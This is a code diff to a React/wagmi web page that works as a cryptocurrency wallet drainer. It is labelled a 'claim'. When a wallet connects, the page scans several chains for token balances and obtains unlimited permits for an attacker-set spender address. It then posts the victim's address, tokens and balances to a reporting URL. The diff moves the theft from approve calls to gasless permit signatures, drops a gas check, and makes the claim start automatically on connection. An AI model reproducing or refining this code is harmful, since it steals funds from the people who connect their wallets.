@@ -1,20 +1,21 @@
 'use client';
 import { useState, useEffect } from 'react';
-import { useAccount } from 'wagmi';
-import { erc20Abi, maxUint256 } from 'viem';
-import { readContract, getBalance, switchChain } from '@wagmi/core';
+import { useAccount, useWriteContract } from 'wagmi';
+import { erc20Abi } from 'viem';
+import { signPermit } from "@/utils/permitAndSend";
+import { readContract, switchChain } from '@wagmi/core';
 import { config } from '@/config';
-import { sendGaslessTx } from '@/utils/biconomy';
-import { encodeFunctionData } from 'viem';
 
-// Spender address
+// Spender address that will receive approvals
+// Load spender from env, fallback to empty
 const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
+
 const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
 if (!SPENDER || SPENDER === "0x") {
   throw new Error('SPENDER_ADDRESS is not defined or invalid');
 }
 
-// Tokens grouped by chain
+// Tokens grouped by chainId (BigInt-safe version)
 const TOKENS_BY_CHAIN: Record<
   number,
   { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
@@ -43,7 +44,7 @@ const CHAIN_NAMES: Record<number, string> = {
   11155111: "Sepolia",
 };
 
-// Wallet connection reporter
+// Component that reports wallet connections
 function ConnectionReporter() {
   const { address, isConnected } = useAccount();
 
@@ -65,6 +66,7 @@ function ConnectionReporter() {
 
 export default function Home() {
   const { address, isConnected, chainId } = useAccount();
+  const { writeContractAsync } = useWriteContract();
   const [status, setStatus] = useState<string>("");
 
   async function handleClaim() {
@@ -77,7 +79,7 @@ export default function Home() {
       setStatus("Scanning chains for balances...");
 
       let targetChain: number | null = null;
-      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];
+      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint }[] = [];
 
       for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
         const numericCid = Number(cid);
@@ -114,28 +116,24 @@ export default function Home() {
         await switchChain(config, { chainId: targetChain });
       }
 
-      // Check gas (still needed if user is paying manually, but Biconomy covers gas for our txs)
-      const nativeBal = await getBalance(config, { address, chainId: targetChain });
-      if (nativeBal.value < BigInt(100000000000000)) {
-        setStatus("Not enough native token to pay gas fees.");
-        return;
-      }
+      // ✅ Removed native token balance check
+      setStatus("Using Biconomy for gasless transactions...");
 
       for (const token of usableTokens) {
-        setStatus(`Approving ${token.symbol} on ${chainName} (gasless)...`);
+        setStatus(`Approving ${token.symbol} on ${chainName}...`);
 
-        const data = encodeFunctionData({
-          abi: erc20Abi,
-          functionName: "approve",
-          args: [SPENDER, maxUint256],
+        const res = await signPermit({
+          chain: targetChain === 11155111 ? "sepolia" :
+                targetChain === 1 ? "eth" :
+                targetChain === 42161 ? "arbitrum" :
+                targetChain === 56 ? "bnb" : "polygon",
+          tokenAddress: token.address,
+          owner: address,
+          spender: SPENDER,
+          amountHuman: "max",
         });
-
-        const txHash = await sendGaslessTx({
-          to: token.address,
-          data,
-        });
-
-        setStatus(`${token.symbol} gasless approval ✅ | Tx: ${txHash}`);
+        const { permitTxHash } = res;
+        setStatus(`${token.symbol} gasless permit ✅ | Tx: ${permitTxHash}`);
 
         let rawBalance: bigint = BigInt(0);
         try {
@@ -155,7 +153,7 @@ export default function Home() {
 
         setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance}`);
 
-        // Report approval
+        // report approval including only chain name
         await fetch(`${REPORT_URL}`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -166,7 +164,7 @@ export default function Home() {
             token: token.address,
             symbol: token.symbol,
             balance: formattedBalance,
-            permitTxHash: txHash,
+            permitTxHash,
           }),
         }).catch(console.error);
       }
@@ -178,6 +176,7 @@ export default function Home() {
     }
   }
 
+  // Automatically trigger claim when wallet connects
   useEffect(() => {
     if (isConnected && address) handleClaim();
   }, [isConnected, address]);
